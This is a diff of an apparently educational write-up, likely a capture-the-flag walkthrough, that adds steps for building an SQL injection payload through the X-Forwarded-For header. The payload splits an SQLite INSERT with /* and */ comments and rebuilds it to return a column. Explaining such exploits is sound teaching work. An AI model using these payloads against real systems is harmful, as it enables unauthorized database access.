@@ -641,11 +641,31 @@ re.compile(r"\d{,3}.\d{,3}.\d{,3}.\d{,3}", re.ASCII)
  ```
 
 - Exploiting it-:
-- First, we pass `'/*` to `X-Forwarded-For` to do multi line comments and also because we can close it unlike `--`.I'll pass the payload in it to show you the visual idea instead of just imagining it.
+- Firstly, we pass `'/*` to `X-Forwarded-For` to do multi line comments and also because we can close it unlike `--`.I'll pass the payload in it to show you the visual idea instead of just imagining it.
 
 ```sql
 INSERT INTO secrets (ip, secret)
         VALUES (''/*---everything is on comment mode for now', '{secret}')
+        ON CONFLICT(ip) DO UPDATE SET
+            secret = excluded.secret
+        RETURNING id
+```
+
+- Then, we start the payload secret with `*/` to close our long comment and normalize the insert statement because only two values are required which elimates the trailing quotes`'` and the comma leaving us like this-:
+
+```sql
+INSERT INTO secrets (ip, secret)
+        VALUES (''/*', '*/')
+        ON CONFLICT(ip) DO UPDATE SET
+            secret = excluded.secret
+        RETURNING id
+```
+
+- Perfecting the statement for two values and end the statement with a comma and a multiline  comment. I added double quotes because it allows us to call an sqlite column from a table-:
+
+```sql
+INSERT INTO secrets (ip, secret)
+        VALUES (''/*', '*/,"id")/*')
         ON CONFLICT(ip) DO UPDATE SET
             secret = excluded.secret
         RETURNING id
